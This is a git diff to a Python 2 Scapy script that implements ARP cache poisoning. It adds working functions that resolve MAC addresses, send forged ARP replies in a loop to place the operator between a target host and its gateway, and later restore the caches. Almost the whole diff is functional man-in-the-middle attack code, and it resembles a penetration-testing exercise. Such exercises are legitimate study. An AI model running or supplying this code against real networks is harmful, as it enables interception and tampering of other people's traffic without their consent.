@@ -20,15 +20,56 @@ packet_count    = ""
 #define functions
 #This function returns the mac address for an IP
 def get_mac(ip_address):
-    pass
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
+
+    #return the mac address from a response
+    for s,r in responses:
+        return r[Ether].src
+    return None
 
 #This funtion restores the arp cache of the target after the poisoning is completed
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    pass
+    print "Restoring target..."
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
+
+    #signals the main thread to exit
+    os.kill(os.getppid(), signal.SIGINT)
 
 #This function spews out arp poisoned packets at target
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    pass
+    
+    #Craft poisoned arp packet for target
+    poison_target       = ARP()
+    poison_target.op    = 2
+    poison_target.psrc  = gateway_ip
+    poison_target.pdst  = target_ip
+    poison_target.hwdst = target_mac
+    
+    #craft poisoned arp packet for Gateway
+    poison_gateway          = ARP()
+    poison_gateway.op       = 2
+    poison_gateway.psrc     = target_ip
+    poison_gateway.pdst     = gateway_ip
+    poison_gateway.hwdst    = gateway_mac
+
+    print "[*] Beginning the ARP poison. [CTRL-C] to stop."
+    
+    #set up loop to poison the arp cache of the target and the gateway
+    while True:
+        try:
+            #send poison arp packets to gateway and target
+            send(poison_target)
+            send(poison_gateway)
+            #sleep 2 seconds between sending packets
+            time.sleep(2)
+        except KeyboardInterrupt:
+            #restore arp caches
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+
+    print "[*] ARP Poison attack finished."
+    return
+
 
 #Define main()
 def main():
@@ -89,14 +130,14 @@ def main():
             sys.exit(1)
 
     except KeyboardInterrupt:
-        print "Operation canceled by keyboard interupt. Restoring Network..."
+        print "Operation canceled by keyboard interupt."
         try:
             #restore the network
             restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
             print "Network Restored.  Exiting."
             sys.exit(0)
         except:
-            print "[WARN] Unable to restore arp caches.  This may lead to instability on targets."
+            print "[!] Unable to restore arp caches.  This may lead to instability on targets."
             print "Exiting."
             sys.exit(1)
         
